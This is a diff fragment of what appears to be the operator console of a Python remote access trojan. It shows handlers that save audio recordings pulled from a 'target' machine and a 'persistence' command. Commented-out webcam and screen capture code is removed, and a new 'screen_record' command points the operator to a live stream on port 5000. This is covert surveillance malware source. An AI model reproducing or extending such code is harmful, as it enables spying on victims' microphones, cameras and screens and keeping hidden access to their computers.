@@ -139,40 +139,13 @@ def target_reqs():
           os.replace("recorded%d.wav" % (count), "recordings/recorded%d.wav" % (count))
           count += 1
           print(termcolor.colored('[+] Done recorded file', 'green'))
-      # elif cmd == 'record_cam':
-      #     f = open('cam_record%d.mp4' % (count), 'wb')
-      #     target.settimeout(27)
-      #     chunk = target.recv(1024)
-      #     while chunk:
-      #         f.write(chunk)
-      #         try:
-      #             chunk = target.recv(1024)
-      #         except socket.timeout as e:
-      #             break
-      #     target.settimeout(None)
-      #     f.close()
-      #     os.replace("cam_record%d.mp4" % (count), "recordings/recorded%d.wav" % (count))
-      #     count += 1
-      #     print(termcolor.colored('[+] Done recorded file', 'green'))
-
       # TODO addming record screen function
 
-      # elif cmd == 'record_screen':
-      #    f = open('output%d.avi' % (count), 'wb')
-      #    target.settimeout(20)
-      #    chunk = target.recv(1024)
-      #    while chunk:
-      #       f.write(chunk)
-      #       try:
-      #          chunk = target.recv(1024)
-      #       except socket.timeout as e:
-      #          print(termcolor.colored('[-] Error: timeout', 'red'))
-      #          pass
-      #    target.settimeout(None)
-      #    f.close()
-      #    count += 1
-      #    print(termcolor.colored('[+] Done recorded file', 'green'))
-
+      elif cmd[:13] == 'screen_record':
+          if cmd[14:] == 'on':
+            print(termcolor.colored('[+] Go to http://yourip/:5000', 'green'))
+          if cmd[14:] == 'off':
+            print(termcolor.colored('[+] Done', 'green'))
       elif cmd[:11] == 'persistence':
           log = reliable_recv()
           print(log)
